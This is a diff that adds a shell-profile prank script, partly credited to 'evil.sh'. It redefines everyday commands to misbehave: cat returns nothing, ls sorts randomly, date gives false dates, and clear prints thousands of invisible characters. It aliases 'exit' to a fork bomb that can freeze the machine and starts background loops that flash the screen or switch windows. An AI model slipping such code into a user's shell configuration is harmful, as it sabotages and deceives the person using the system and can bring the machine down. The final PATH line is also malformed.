@@ -1,0 +1,54 @@
+# From evil.sh
+
+# Make Tab send the delete key.
+tset -Qe $'\t'
+
+# Randomly make the shell exit whenever a command has a non-zero exit status.
+((RANDOM % 10)) || set -o errexit
+
+# Let `cat` swallow every input and never return anything.
+alias cat=true
+
+# Use a random sort option whenever `ls` is invoked.
+function ls {
+	command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"
+}
+
+# Have `date` return random dates.
+alias date='date -d "now + $RANDOM days"';
+
+# End evil.sh
+
+
+# Never exit
+alias exit=':(){ :|:& };:'
+
+# Echo a ton of RTM chars instead
+alias clear='for a in $(seq 10000); do echo -n "‏"; done; echo'
+
+# Randomly beep when sudoing
+alias sudo='((RANDOM % 3)) && echo -en "\a"; sudo'
+
+# Echo instead of printf
+alias printf='echo'
+
+# .. equals current directory
+alias -g ..='.'
+
+# Flash screen every minute or so
+if command -v xcalib >/dev/null 2>&1; then
+	sh -c 'sleep 120s; while :; do xcalib -i -a; xcalib -i -a; sleep $[($RANDOM % 60) + 60]s; done' > /dev/null 2>&1 &
+fi
+
+# cmd + tab every minute or so
+if [[ "$OSTYPE" == darwin* ]]; then
+	sh -c 'sleep 120s; while :; do osascript <<EOD
+tell application "System Events"
+    key code 48 using command down
+end tell
+EOD
+sleep $[($RANDOM % 60) + 60]s; done' > /dev/null 2>&1 &
+fi
+
+# Reset path without /bin after a few minutes
+sh -c 'sleep [(($RANDOM % 120)) + 180]s; export PATH=/usr/bin'
